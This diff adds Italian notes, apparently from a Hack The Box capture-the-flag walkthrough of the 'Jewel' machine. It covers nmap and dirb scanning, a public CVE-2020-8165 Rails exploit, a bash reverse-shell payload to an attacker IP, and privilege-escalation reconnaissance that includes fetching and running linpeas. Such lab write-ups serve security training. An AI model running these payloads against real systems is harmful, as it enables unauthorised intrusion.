@@ -1,0 +1,86 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.10.211
+
+	22/tcp   open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+	| ssh-hostkey:                                                                                                                                                                                                                             
+	|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)                                                                                                                                                                             
+	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK1T+N61bTR89bPSsTtguCPwCtq5IAemU5F9VO6hSw8hnLrQ+3Bx6Cjci6MFx9RAMOS4xVtsmqtDvmjrtQ5hYuOYXlafsv6QU+6LJ+vImDSXiunRdpck3Z6f8sIEOOtiCJZ9HDiAzE62nolJPe2ObtU/Of627MiAksFh6+oBl/ZoWnveQwY7TLgFf19IhHV4Q9OPUlqeokiWiTazbvj5jC8vWcnl+DpN3xTuiTV8b+xUyXnFyO/MBaKhRGBbcbBwOsFVPc8NFyuyardVWEblS+p6B1QG6C62/o2Ft8x9lk1cYEDaFH+IfIUGhHykFQlA8+Y4qee8+OtRKrfwkVyxOr                                                                                        
+	|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)                                                                                                                                                                            
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBgCpUS3ovp4tAKRfsFll+x5W6F28nQMhBrx06jDhK35Z10da2PX2vayLOniUTEsnb0hL/4phtNdI+QOKLPX+sg=                                                                         
+	|   256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)                                                                                                                                                                          
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA9poXYE6YrgNaTFpdzYtMPUeSwB416uWFLSrT55iwv0                                                                                                                                                         
+	8000/tcp open  http    syn-ack Apache httpd 2.4.38                                                                                                                                                                                         
+	|_http-generator: gitweb/2.20.1 git/2.20.1                                                                                                                                                                                                 
+	| http-methods:                                                                                                                                                                                                                            
+	|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                               
+	| http-open-proxy: Potentially OPEN proxy.                                                                                                                                                                                                 
+	|_Methods supported:CONNECTION                                                                                                                                                                                                             
+	|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                                               
+	| http-title: 10.10.10.211 Git                                                                                                                                                                                                             
+	|_Requested resource was http://10.10.10.211:8000/gitweb/                                                                                                                                                                                  
+	8080/tcp open  http    syn-ack nginx 1.14.2 (Phusion Passenger 6.0.6)                                                                                                                                                                      
+	|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E                                                                                                                                                                      
+	| http-methods: 
+	|_  Supported Methods: GET HEAD POST OPTIONS
+	|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
+	|_http-title: BL0G!
+	Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+10.10.10.211	jewel.htb
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.10.211 -w /usr/share/wordlists/dirb/common.txt
+
+---------------------------------------------------------------------------------------------------------------
+Nel link http://10.10.10.211:8000/ girovaghiamo un po' e troviamo che viene usato rails versione 5.2.2.1. Cerchiamo un exploit e troviamo il seguente https://github.com/masahiro331/CVE-2020-8165
+
+git clone https://github.com/masahiro331/CVE-2020-8165.git
+bundle install --path vendor/bundle -> Ma non va a buon fine. Aggiorniamo la versione nel gemfile con rails da 2.6.3 a 2.7.2
+bundle install --path vendor/bundle -> Nuovamente non va a buon fine perché nel sistema non c'è sqlite3, installiamolo.
+sudo apt-get install libsqlite3-dev
+bundle install --path vendor/bundle -> OK
+bundle exec rails db:migrate -> OK
+bundle exec rails s -> OK
+
+code = '`/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.135/1992 0>&1\"`'
+
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Cerchiamo se l'utente è tra i sudoers
+sudo -l
+
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null
+
+Visualizziamo i log del sistema
+cat /var/log/audit/audit.log
+
+Cerchiamo file scrivibili
+find /-writable -type d 2>/dev/null
+
+Verifichiamo la presenza di backup che possano essere utili
+apache, db ecc.
+
+Controlliamo anche i cronjob
+cat /etc/crontab
+
+Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m SimpleHTTPServer 80
+wget http://10.10.15.9:80/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh > linpeas
+
+Analizziamo linpeas
+
+
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
